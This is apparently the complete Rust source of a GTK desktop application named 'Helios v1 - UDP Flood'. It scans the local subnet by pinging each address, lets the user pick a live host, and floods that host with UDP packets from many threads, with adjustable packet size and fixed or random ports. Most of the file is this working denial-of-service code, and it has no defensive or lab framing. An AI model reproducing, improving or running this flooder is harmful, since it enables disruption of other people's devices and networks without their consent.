use gtk4::prelude::*;
use relm4::{gtk, ComponentParts, ComponentSender, RelmApp, SimpleComponent, RelmWidgetExt};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use std::net::{UdpSocket, SocketAddr};
use std::process::Command;
use local_ip_address::local_ip;
use rand::Rng;

const STATS_INTERVAL: u64 = 1;

#[derive(Debug, Clone, PartialEq)]
enum AppState {
    Idle,
    Scanning,
    Flooding,
}

struct AppModel {
    state: AppState,
    
    // Network Info
    local_ip: String,
    subnet_prefix: String,
    live_ips: Vec<String>,
    target_model: gtk::StringList,
    
    // Parameters
    threads: f64,
    packet_size: f64,
    port: f64,
    random_ports: bool,
    
    // Selected Target index
    selected_target_idx: u32,
    
    // Stats
    total_packets: u64,
    pps: f64,
    elapsed_secs: f64,
    
    running_flag: Arc<AtomicBool>,
}

#[derive(Debug)]
enum AppInput {
    ScanNetwork,
    ScanResult(Vec<String>),
    UpdateSelectedTarget(u32),
    UpdateThreads(f64),
    UpdatePacketSize(f64),
    UpdatePort(f64),
    ToggleRandomPorts(bool),
    StartFlood,
    StopFlood,
    UpdateStats { pkts: u64, pps: f64, elapsed: f64 },
    FloodFinished,
}

#[relm4::component]
impl SimpleComponent for AppModel {
    type Init = ();
    type Input = AppInput;
    type Output = ();

    view! {
        gtk::Window {
            set_title: Some("Helios v1 - UDP Flood"),
            set_default_width: 450,
            set_default_height: 550,

            gtk::Box {
                set_orientation: gtk::Orientation::Vertical,
                set_spacing: 12,
                set_margin_all: 24,

                // --- Network Section ---
                gtk::Label { set_label: "<b>Network</b>", set_use_markup: true, set_halign: gtk::Align::Start },
                
                gtk::Box {
                    set_orientation: gtk::Orientation::Horizontal,
                    set_spacing: 12,
                    gtk::Label {
                        #[watch]
                        set_label: &format!("Local IP: {}", model.local_ip),
                    },
                    gtk::Label {
                        #[watch]
                        set_label: &format!("Subnet: {}*", model.subnet_prefix),
                    },
                },
                
                gtk::Box {
                    set_orientation: gtk::Orientation::Horizontal,
                    set_spacing: 12,

                    gtk::Button {
                        #[watch]
                        set_label: if model.state == AppState::Scanning { "Scanning..." } else { "Scan Network" },
                        #[watch]
                        set_sensitive: model.state == AppState::Idle,
                        connect_clicked => AppInput::ScanNetwork,
                    },
                    
                    #[name(target_dropdown)]
                    gtk::DropDown {
                        set_hexpand: true,
                        set_model: Some(&model.target_model),
                        #[watch]
                        set_sensitive: model.state == AppState::Idle && !model.live_ips.is_empty(),
                        connect_selected_notify[sender] => move |dropdown| {
                            sender.input(AppInput::UpdateSelectedTarget(dropdown.selected()));
                        }
                    }
                },

                gtk::Separator { set_margin_top: 8, set_margin_bottom: 8 },

                // --- Parameters Section ---
                gtk::Label { set_label: "<b>Parameters</b>", set_use_markup: true, set_halign: gtk::Align::Start },
                
                gtk::Grid {
                    set_column_spacing: 12,
                    set_row_spacing: 12,

                    // Threads
                    attach[0, 0, 1, 1] = &gtk::Label { set_label: "Threads:", set_halign: gtk::Align::End },
                    attach[1, 0, 1, 1] = &gtk::SpinButton {
                        set_adjustment: &gtk::Adjustment::new(8.0, 1.0, 128.0, 1.0, 10.0, 0.0),
                        set_value: model.threads,
                        #[watch]
                        set_sensitive: model.state == AppState::Idle,
                        connect_value_changed[sender] => move |spin| {
                            sender.input(AppInput::UpdateThreads(spin.value()));
                        },
                    },

                    // Packet Size
                    attach[0, 1, 1, 1] = &gtk::Label { set_label: "Packet Size:", set_halign: gtk::Align::End },
                    attach[1, 1, 1, 1] = &gtk::SpinButton {
                        set_adjustment: &gtk::Adjustment::new(1024.0, 1.0, 65507.0, 1.0, 100.0, 0.0),
                        set_value: model.packet_size,
                        #[watch]
                        set_sensitive: model.state == AppState::Idle,
                        connect_value_changed[sender] => move |spin| {
                            sender.input(AppInput::UpdatePacketSize(spin.value()));
                        },
                    },

                    // Port
                    attach[0, 2, 1, 1] = &gtk::Label { set_label: "Port:", set_halign: gtk::Align::End },
                    attach[1, 2, 1, 1] = &gtk::Box {
                        set_orientation: gtk::Orientation::Horizontal,
                        set_spacing: 12,

                        gtk::SpinButton {
                            set_adjustment: &gtk::Adjustment::new(9.0, 1.0, 65535.0, 1.0, 100.0, 0.0),
                            set_value: model.port,
                            #[watch]
                            set_sensitive: model.state == AppState::Idle && !model.random_ports,
                            connect_value_changed[sender] => move |spin| {
                                sender.input(AppInput::UpdatePort(spin.value()));
                            },
                        },
                        gtk::CheckButton {
                            set_label: Some("Random"),
                            set_active: model.random_ports,
                            #[watch]
                            set_sensitive: model.state == AppState::Idle,
                            connect_toggled[sender] => move |check| {
                                sender.input(AppInput::ToggleRandomPorts(check.is_active()));
                            },
                        }
                    }
                },

                gtk::Separator { set_margin_top: 8, set_margin_bottom: 8 },

                // --- Action ---
                gtk::Box {
                    set_orientation: gtk::Orientation::Horizontal,
                    set_spacing: 12,
                    set_halign: gtk::Align::Center,
                    set_margin_top: 12,
                    set_margin_bottom: 12,

                    gtk::Button {
                        set_label: "Start Flood",
                        add_css_class: "suggested-action",
                        #[watch]
                        set_sensitive: model.state == AppState::Idle && !model.live_ips.is_empty(),
                        connect_clicked => AppInput::StartFlood,
                    },
                    gtk::Button {
                        set_label: "Stop Flood",
                        add_css_class: "destructive-action",
                        #[watch]
                        set_sensitive: model.state == AppState::Flooding,
                        connect_clicked => AppInput::StopFlood,
                    }
                },

                // --- Stats Status (Footer) ---
                gtk::Separator { set_margin_top: 8, set_margin_bottom: 8 },
                
                gtk::Box {
                    set_orientation: gtk::Orientation::Horizontal,
                    set_spacing: 16,
                    set_halign: gtk::Align::Center,
                    set_margin_top: 4,
                    
                    gtk::Label {
                        #[watch]
                        set_label: &format!("Status: {:?}", model.state),
                        set_css_classes: &["dim-label"],
                    },
                    gtk::Separator {
                        set_orientation: gtk::Orientation::Vertical,
                    },
                    gtk::Label {
                        #[watch]
                        set_label: &format!("Sent: {}", model.total_packets),
                        set_css_classes: &["dim-label"],
                    },
                    gtk::Separator {
                        set_orientation: gtk::Orientation::Vertical,
                    },
                    gtk::Label {
                        #[watch]
                        set_label: &format!("Speed: {:.0}/s", model.pps),
                        set_css_classes: &["dim-label"],
                    },
                    gtk::Separator {
                        set_orientation: gtk::Orientation::Vertical,
                    },
                    gtk::Label {
                        #[watch]
                        set_label: &format!("Time: {:.1}s", model.elapsed_secs),
                        set_css_classes: &["dim-label"],
                    }
                }
            }
        }
    }

    fn init(
        _init: Self::Init,
        root: Self::Root,
        sender: ComponentSender<Self>,
    ) -> ComponentParts<Self> {
        let mut local_ip_str = String::from("127.0.0.1");
        if let Ok(ip) = local_ip() {
            local_ip_str = ip.to_string();
        }
        let subnet_prefix = local_ip_str.rsplitn(2, '.').last().unwrap_or("192.168.1").to_string() + ".";

        let target_model = gtk::StringList::new(&["No devices found"]);

        let model = AppModel {
            state: AppState::Idle,
            local_ip: local_ip_str,
            subnet_prefix,
            live_ips: vec![],
            target_model,
            threads: 8.0,
            packet_size: 1024.0,
            port: 9.0,
            random_ports: false,
            selected_target_idx: 0,
            total_packets: 0,
            pps: 0.0,
            elapsed_secs: 0.0,
            running_flag: Arc::new(AtomicBool::new(false)),
        };

        let widgets = view_output!();
        ComponentParts { model, widgets }
    }

    fn update(&mut self, message: Self::Input, sender: ComponentSender<Self>) {
        match message {
            AppInput::ScanNetwork => {
                self.state = AppState::Scanning;
                
                let subnet = self.subnet_prefix.clone();
                let snd = sender.clone();
                
                thread::spawn(move || {
                    let mut handles = vec![];
                    let mut found_ips = vec![];
                    
                    for i in 1..=254 {
                        let ip = format!("{}{}", subnet, i);
                        let handle = thread::spawn(move || {
                            let output = Command::new("ping")
                                .arg("-c1")
                                .arg("-W1")
                                .arg(&ip)
                                .output()
                                .ok();

                            output.and_then(|out| if out.status.success() { Some(ip) } else { None })
                        });
                        handles.push(handle);
                    }

                    for h in handles {
                        if let Ok(Some(ip)) = h.join() {
                            found_ips.push(ip);
                        }
                    }
                    found_ips.sort();
                    snd.input(AppInput::ScanResult(found_ips));
                });
            }
            AppInput::ScanResult(ips) => {
                self.state = AppState::Idle;
                self.live_ips = ips.clone();
                self.selected_target_idx = 0;
                
                let n_items = self.target_model.n_items();
                if self.live_ips.is_empty() {
                    self.target_model.splice(0, n_items, &["No devices found"]);
                } else {
                    let ips_refs: Vec<&str> = self.live_ips.iter().map(|s| s.as_str()).collect();
                    self.target_model.splice(0, n_items, &ips_refs);
                }
            }
            AppInput::UpdateSelectedTarget(idx) => {
                self.selected_target_idx = idx;
            }
            AppInput::UpdateThreads(val) => self.threads = val,
            AppInput::UpdatePacketSize(val) => self.packet_size = val,
            AppInput::UpdatePort(val) => self.port = val,
            AppInput::ToggleRandomPorts(val) => self.random_ports = val,
            AppInput::StartFlood => {
                if self.live_ips.is_empty() { return; }
                let target_ip = self.live_ips[self.selected_target_idx as usize].clone();
                
                self.state = AppState::Flooding;
                self.total_packets = 0;
                self.pps = 0.0;
                self.elapsed_secs = 0.0;
                
                self.running_flag.store(true, Ordering::SeqCst);
                
                let running = self.running_flag.clone();
                let thread_count = self.threads as usize;
                let payload_size = self.packet_size as usize;
                let random_ports = self.random_ports;
                let base_port = self.port as u16;
                let snd = sender.clone();
                
                thread::spawn(move || {
                    let total_packets = Arc::new(AtomicU64::new(0));
                    let start_time = Instant::now();
                    let mut handles = vec![];

                    for _ in 0..thread_count {
                        let running_thread = running.clone();
                        let thread_total = total_packets.clone();
                        let target_ip_th = target_ip.clone();

                        let handle = thread::spawn(move || {
                            let socket = UdpSocket::bind("0.0.0.0:0").expect("Failed to create socket");
                            let mut rng = rand::thread_rng();

                            while running_thread.load(Ordering::Relaxed) {
                                let local_port = if random_ports {
                                    rng.gen_range(1..=65535)
                                } else {
                                    base_port
                                };

                                let target: SocketAddr = format!("{}:{}", target_ip_th, local_port)
                                    .parse()
                                    .unwrap_or_else(|_| "127.0.0.1:80".parse().unwrap());

                                let payload = vec![0u8; payload_size];

                                if socket.send_to(&payload, target).is_ok() {
                                    thread_total.fetch_add(1, Ordering::Relaxed);
                                }
                            }
                        });
                        handles.push(handle);
                    }
                    
                    let running_stats = running.clone();
                    let stats_total = total_packets.clone();
                    let snd_stats = snd.clone();
                    
                    thread::spawn(move || {
                        while running_stats.load(Ordering::Relaxed) {
                            thread::sleep(Duration::from_millis(STATS_INTERVAL * 1000));
                            let elapsed = start_time.elapsed().as_secs_f64();
                            let pkts = stats_total.load(Ordering::Relaxed);
                            let pps = if elapsed > 0.0 { pkts as f64 / elapsed } else { 0.0 };
                            
                            // To prevent message flooding, only send stats if still running
                            if running_stats.load(Ordering::Relaxed) {
                                snd_stats.input(AppInput::UpdateStats { pkts, pps, elapsed });
                            }
                        }
                    });
                    
                    for h in handles {
                        let _ = h.join();
                    }
                    
                    // Allow UI to stop stats update
                    snd.input(AppInput::FloodFinished);
                });
            }
            AppInput::StopFlood => {
                self.running_flag.store(false, Ordering::SeqCst);
                self.state = AppState::Idle;
            }
            AppInput::UpdateStats { pkts, pps, elapsed } => {
                self.total_packets = pkts;
                self.pps = pps;
                self.elapsed_secs = elapsed;
            }
            AppInput::FloodFinished => {
                self.state = AppState::Idle;
                self.running_flag.store(false, Ordering::SeqCst);
            }
        }
    }
}

fn main() {
    let app = RelmApp::new("helios.udp.flood");
    app.run::<AppModel>(());
}
